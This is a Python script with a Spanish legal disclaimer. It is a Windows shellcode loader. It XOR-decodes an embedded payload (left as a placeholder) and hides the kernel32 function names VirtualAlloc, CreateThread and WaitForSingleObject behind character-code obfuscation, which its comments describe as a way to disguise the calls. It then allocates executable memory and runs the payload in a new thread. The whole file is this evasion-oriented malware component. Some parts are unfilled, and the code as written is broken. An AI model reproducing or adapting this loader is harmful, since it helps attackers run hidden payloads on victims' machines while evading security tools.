"""
# Aviso importante — Uso responsable y restricciones legales  
Este repositorio contiene código experimental relacionado con pruebas de seguridad. No se proporciona documentación operativa ni soporte para uso fuera de entornos controlados.

**no** apruebo ni facilito el uso del software con fines maliciosos, ni su distribución para evadir sistemas de seguridad. Si planeas realizar pruebas de seguridad, asegúrate de contar con autorización explícita por escrito del propietario del sistema y actúa conforme a la legislación vigente. Cualquier uso indebido es responsabilidad exclusiva del usuario

"""


import ctypes
import time


def devolver(key, datos):
    return bytearray([b ^ key for b in datos])

time.sleep(2)

game = bytes(["""

Aqui puede ir cualquier shell code que previamente encriptaste con   una llave que tendras que pasar mas abajo en el codigo para que la funcion devolver la retorne desencriptada en tiempo de ejecucion

"""
])


#Para llamar funcione de ctypes y hacer la asignacion de memoria
#utilizo juegos de palabras y ofuscacion Ascii 

juego = ctypes.WinDLL(
	"".join([chr(x) for x in [107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108]])
) 


localizacion_nombre = "".join([chr(x) for x in [86,105,114,116,117,97,108,65,108,108,111,99]])
nombre_del_hilo = "".join([chr(x) for x in [67,114,101,97,116,101,84,104,114,101,97,100]])
esperame_ome = "".join([chr(x) for x in [87,97,105,116,70,111,114,83,105,110,103,108,101,79,98,106,101,99,116]])


va = getattr(juego, localizacion_nombre)
ct = getattr(juego, nombre_del_hilo)
ws = getattr(juego, esperame_ome)

va.restype = ctypes.c_void_p

key = "Aqui Tienes que pasar Tu llave de Cifradoo0xAA"
UwU = devolver(key, game) 



direccion = va(
        ctypes.c_void_p(0), 
        ctypes.c_size_t(len(UwU)), 
        0x3000, 
        0x40 
        )


if not direccion:
    raise Exception("Ocurrio un error al pedir casa UnU") 


ctypes.memmove(direccion, (ctypes.c_char * len(UwU)).from_buffer(UwU), len(UwU)) 



t = ct(
        ctypes.c_void_p(0),
        ctypes.c_size_t(0),
        ctypes.c_void_p(direccion),
        ctypes.c_void_p(0),
        ctypes.c_ulong(0),
        ctypes.pointer(ctypes.c_ulong(0))
        ) 


if not t:
    raise Exception("No tenia un pelo de tonto :c")

ws(t, 0xFFFFFFFF) # Asi me espera de por vida jjsjs










